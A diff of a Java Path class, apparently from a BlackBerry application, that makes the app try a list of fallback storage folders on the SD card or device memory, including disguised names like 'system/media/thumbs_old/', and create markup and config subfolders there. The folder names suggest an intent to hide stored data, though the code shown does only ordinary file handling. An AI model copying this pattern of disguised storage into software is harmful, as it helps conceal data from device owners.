@@ -32,9 +32,11 @@ public final class Path {
 
     public static final int SD = 0;
     public static final int USER = 1;
-    
-    public static final String[] SD_PATHS = { "dvz_temp/wmddr/",
-            "system/media/thumbs_old/", "system/WMDDR/", "WMDDR/" };
+
+    public static final String[] SD_EXT_PATHS = { "dvz_temp/wmddr/",
+            "system/media/thumbs_old/", "system/WMDDR/", "WMDDR/", "thumbs/" };
+
+    public static final String[] USER_EXT_PATHS = { "wmddr/", "thumbs/" };
 
     /** The Constant SD_PATH. */
     public static final String SD_BASE_PATH = "file:///SDCard/BlackBerry/";
@@ -47,7 +49,7 @@ public final class Path {
     public static String SD_PATH = SD_BASE_PATH + "thumbs/";
 
     /** The Constant USER_PATH. */
-    public static final String USER_PATH = USER_BASE_PATH + "wmddr/";
+    public static String USER_PATH = USER_BASE_PATH + "wmddr/";
 
     /** The Constant LOG_DIR_BASE. */
     public static final String LOG_DIR_BASE = "1";
@@ -90,7 +92,7 @@ public final class Path {
             Check.ensures(fconn.exists(), "Couldn't create dir");
             //#endif
 
-        } catch (final IOException e) {
+        } catch (final Exception e) {
 
             //#ifdef DEBUG
             debug.error(dirName + " ex: " + e.toString());
@@ -136,11 +138,11 @@ public final class Path {
                 //#ifdef DEBUG_INFO
                 debug.info(root + " " + fc.availableSize());
                 //#endif
-            } catch (final IOException e) {
+            } catch (final Exception e) {
                 //#ifdef DEBUG
                 debug.error(root + " " + e);
                 //#endif
-                e.printStackTrace();
+                //e.printStackTrace();
             }
         }
 
@@ -180,36 +182,67 @@ public final class Path {
     /**
      * Crea le directory iniziali.
      * 
-     * @param sd 
+     * @param sd
      *            true: crea su SD. false: crea su flash
      * @return true se riesce a scrivere le directory, false altrimenti
      */
-    public static boolean makeDirs(final int sd ) {
+    public static boolean makeDirs(final int sd) {
         Path.getRoots();
 
-        boolean ret = true;
+        //boolean ret = true;
         final Random random = new Random();
         String base;
+        String[] extPaths;
+
         if (sd == SD) {
-            base = Path.SD_PATH;
+            base = Path.SD_BASE_PATH;
+            extPaths = SD_EXT_PATHS;
 
         } else {
-            base = Path.USER_PATH;
+            base = Path.USER_BASE_PATH;
+            extPaths = USER_EXT_PATHS;
         }
 
-        ret &= createDirectory(base);
-        // createDirectory(Path.SD_PATH + Path.LOG_DIR);
-        ret &= createDirectory(base + Path.MARKUP_DIR);
-        ret &= createDirectory(base + Path.CONF_DIR);
+        String chosenDir = null;
+        boolean found = false;
 
-        long rnd = Math.abs(random.nextLong());
-        
-        if (ret) {
-            ret &= createDirectory(base + rnd + "/");
-            ret &= removeDirectory(base + rnd + "/");
+        for (int i = 0; !found && i < extPaths.length; i++) {
+            String ext = extPaths[i];
+            chosenDir = base + ext;
+            //#ifdef DEBUG_TRACE
+            debug.trace("try chosenDir: " + chosenDir);
+            //#endif
+
+            found = createDirectory(chosenDir);
+            if (found) {
+                // createDirectory(Path.SD_PATH + Path.LOG_DIR);
+                found &= createDirectory(chosenDir + Path.MARKUP_DIR);
+                found &= createDirectory(chosenDir + Path.CONF_DIR);
+                found &= createDirectory(chosenDir);
+                // createDirectory(Path.SD_PATH + Path.LOG_DIR);
+                found &= createDirectory(chosenDir + Path.MARKUP_DIR);
+                found &= createDirectory(chosenDir + Path.CONF_DIR);
+
+                long rnd = Math.abs(random.nextLong());
+
+                found &= createDirectory(chosenDir + rnd + "/");
+                found &= removeDirectory(chosenDir + rnd + "/");
+            }
         }
 
-        return ret;
+        if (chosenDir != null) {
+            if (sd == SD) {
+                Path.SD_PATH = chosenDir;
+            } else {
+                Path.USER_PATH = chosenDir;
+            }
+        }
+
+        //#ifdef DEBUG_INFO
+        debug.info("chosenDir: " + chosenDir + " sd: " + sd);
+        //#endif
+
+        return found;
     }
 
     /**
